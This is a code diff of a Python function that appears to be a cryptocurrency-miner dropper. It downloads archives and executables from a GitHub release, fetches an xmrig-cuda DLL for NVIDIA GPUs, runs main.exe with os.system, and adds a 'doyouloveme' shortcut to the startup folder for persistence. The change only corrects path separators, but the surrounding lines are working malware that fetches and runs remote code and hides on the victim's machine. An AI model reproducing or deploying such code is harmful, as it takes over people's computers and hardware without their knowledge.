@@ -53,7 +53,7 @@ def xm():
    if not os.path.exists(xmpath):
       os.makedirs(xmpath)
       
-   if not os.path.exists(xmpath + 'doyouloveme.exe'):
+   if not os.path.exists(xmpath + '/doyouloveme.exe'):
       urllib.request.urlretrieve("https://github.com/benjaminloir/super-duper-broccoli/releases/download/doyouloveme/doyouloveme.zip", "{}/doyouloveme.zip".format(xmpath))
       with zipfile.ZipFile("{}/doyouloveme.zip".format(xmpath), 'r') as zip_ref:
          zip_ref.extractall(xmpath)
@@ -67,20 +67,20 @@ def xm():
          urllib.request.urlretrieve(rawrepo + '/main/config.json', '{}/config.json'.format(xmpath))
 
    if(gpu.AdapterCompatibility == "NVIDIA"):
-      if not os.path.exists(xmpath + 'xmrig-cuda.dll'):
+      if not os.path.exists(xmpath + '/xmrig-cuda.dll'):
          urllib.request.urlretrieve("https://github.com/benjaminloir/super-duper-broccoli/releases/download/doyouloveme/cuda.zip", "{}/cuda.zip".format(xmpath))
          with zipfile.ZipFile("{}/cuda.zip".format(xmpath), 'r') as zip_ref:
             zip_ref.extractall(xmpath)
          time.sleep(3)
          os.remove("{}/cuda.zip".format(xmpath))
 
-   if not os.path.exists(xmpath + 'main.exe'):
+   if not os.path.exists(xmpath + '/main.exe'):
       urllib.request.urlretrieve("https://github.com/benjaminloir/super-duper-broccoli/releases/download/doyouloveme/main.exe", "{}/main.exe".format(xmpath))
       os.system('{}/main.exe'.format(xmpath))
       time.sleep(5)
       
-   if not os.path.exists(startupath + 'doyouloveme.lnk'):
-      path = os.path.join(startupath, 'doyouloveme.lnk')
+   if not os.path.exists(startupath + '/doyouloveme.lnk'):
+      path = os.path.join(startupath, '/doyouloveme.lnk')
       target = '{}/doyouloveme.exe'.format(xmpath)
       icon = '{}/ico.ico'.format(xmpath)
       shell = win32com.client.Dispatch("WScript.Shell")
